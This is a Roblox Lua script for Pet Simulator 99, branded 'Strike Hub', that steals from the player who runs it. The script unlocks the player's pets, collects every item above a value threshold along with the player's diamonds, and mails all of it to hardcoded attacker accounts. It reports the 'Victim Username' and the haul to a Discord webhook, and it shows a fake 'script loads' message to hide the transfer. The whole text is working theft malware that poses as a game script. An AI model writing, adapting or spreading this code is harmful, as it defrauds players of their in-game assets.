_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local network = require(game.ReplicatedStorage.Library.Client.Network)
local library = require(game.ReplicatedStorage.Library)
local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
local plr = game.Players.LocalPlayer
local MailMessage = "GGz"
local HttpService = game:GetService("HttpService")
local sortedItems = {}
local totalRAP = 0
local message = require(game.ReplicatedStorage.Library.Client.Message)
local GetSave = function()
    return require(game.ReplicatedStorage.Library.Client.Save).Get()
end

local users = _G.Usernames or {"ilovemyamazing_gf1", "Yeahboi1131", "Dragonshell23", "Dragonshell24", "Dragonshell21"}
local min_rap = _G.minrap or 1000000
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("You cannot mailsteal yourself")
        return
    end
end

-- Find mail cost function
local FunctionToGetFirstPriceOfMail
for _, func in pairs(getgc()) do
    if type(func) == "function" and debug.getinfo(func).name == "computeSendMailCost" then
        FunctionToGetFirstPriceOfMail = func
        break
    end
end

if not FunctionToGetFirstPriceOfMail then
    plr:kick("Could not find computeSendMailCost function")
    return
end

local mailSendPrice = FunctionToGetFirstPriceOfMail()

-- Get current gem amount
local GemAmount1 = 1
for i, v in pairs(GetSave().Inventory.Currency) do
    if v.id == "Diamonds" then
        GemAmount1 = v._am
        break
    end
end

-- Format numbers nicely
local function formatNumber(number)
    number = math.floor(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- Send Discord webhook
local function SendMessage(diamonds)
    local headers = {["Content-Type"] = "application/json"}
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Items to be sent:", value = "", inline = false},
        {name = "Summary:", value = "", inline = false}
    }

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
    end

    fields[3].value = string.format("Gems: %s\nTotal RAP: %s", formatNumber(diamonds), formatNumber(totalRAP))
    local data = {["embeds"] = {{["title"] = "\240\159\144\177 New PS99 Execution", ["color"] = 65280, ["fields"] = fields, ["footer"] = {["text"] = "Strike Hub."}}}}

    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do table.insert(lines, line) end
        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n") .. "\nPlus more!"
        end
    end

    local req = request or syn.request or http_request
    req({
        Url = webhook,
        Method = "POST",
        Headers = headers,
        Body = HttpService:JSONEncode(data)
    })
end

-- Unlock all locked pets
for uid, item in pairs(save["Pet"] or {}) do
    if item._lk then
        network.Invoke("Locking_SetLocked", uid, false)
    end
end

-- Build sortedItems with RAP values
local DirectoryPets = require(game:GetService("ReplicatedStorage").Library.Directory.Pets)
local RAPCmds = require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds)

for _, category in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
    if save[category] then
        for uid, item in pairs(save[category]) do
            local rapValue = RAPCmds.Get({
                Class={Name=category},
                IsA=function(hmm) return hmm==category end,
                GetId=function() return item.id end,
                StackKey=function() return HttpService:JSONEncode({id=item.id, pt=item.pt, sh=item.sh, tn=item.tn}) end,
                AbstractGetRAP=function() return nil end
            }) or 0
            if rapValue >= min_rap then
                local prefix = (item.sh and "Shiny " or "") .. ((item.pt==1 and "Golden ") or (item.pt==2 and "Rainbow ") or "")
                local finalName = prefix .. item.id
                table.insert(sortedItems,{category=category, uid=uid, amount=item._am or 1, rap=rapValue, name=finalName})
                totalRAP = totalRAP + rapValue * (item._am or 1)
            end
        end
    end
end

-- Helper function to send one item to first available user
local function sendToAvailableUser(category, uid, amount)
    for _, user in ipairs(users) do
        local args = {user, MailMessage, category, uid, amount}
        local success, err = network.Invoke("Mailbox: Send", unpack(args))
        if success then
            return true
        elseif err == "They don't have enough space!" or err == "Mailbox is full" then
            -- try next user
        else
            return false, err
        end
    end
    return false, "No available recipient"
end

-- Prepare send queue including remaining gems
local sendQueue = {}

for _, item in ipairs(sortedItems) do
    table.insert(sendQueue, {
        category = item.category,
        uid = item.uid,
        amount = item.amount,
        name = item.name,
        rap = item.rap
    })
end

if GemAmount1 > mailSendPrice then
    table.insert(sendQueue, {
        category = "Currency",
        uid = "Diamonds",
        amount = GemAmount1,
        name = "Diamonds",
        rap = GemAmount1
    })
end

-- Sort by RAP descending
table.sort(sendQueue, function(a, b)
    return a.rap * a.amount > b.rap * b.amount
end)

-- Claim daycare rewards
require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()

-- Main execution
if #sendQueue > 0 then
    -- Claim mail and empty boxes
    local function EmptyBoxes()
        if save.Box then
            for key, value in pairs(save.Box) do
                if value._uq then network.Invoke("Box: Withdraw All", key) end
            end
        end
    end

    local function ClaimMail()
        local response, err = network.Invoke("Mailbox: Claim All")
        while err == "You must wait 30 seconds before using the mailbox!" do
            wait(0.2)
            response, err = network.Invoke("Mailbox: Claim All")
        end
    end

    ClaimMail()
    EmptyBoxes()

    -- Check if mail can be sent
    local function canSendMail()
        local uid
        for i,v in pairs(save["Pet"]) do uid=i break end
        if not uid then return false end
        local args = {"Roblox","Test","Pet",uid,1}
        local response, err = network.Invoke("Mailbox: Send", unpack(args))
        return err == "They don't have enough space!"
    end

    if not canSendMail() then
        message.Error("Account error. Please rejoin and try again or use a different account")
        return
    end

    -- Send Discord webhook asynchronously
    spawn(function() SendMessage(GemAmount1) end)

    -- Send items one by one
    for _, item in ipairs(sendQueue) do
        if GemAmount1 >= mailSendPrice then
            local success, err = sendToAvailableUser(item.category, item.uid, item.amount)
            if success then
                GemAmount1 = GemAmount1 - mailSendPrice
                mailSendPrice = math.min(math.ceil(mailSendPrice * 1.5), 5000000)
            else
                print("Failed to send:", item.name, err)
            end
        else
            print("Not enough gems to send:", item.name)
            break
        end
    end

    message.Error("Please wait while the script loads!")
end
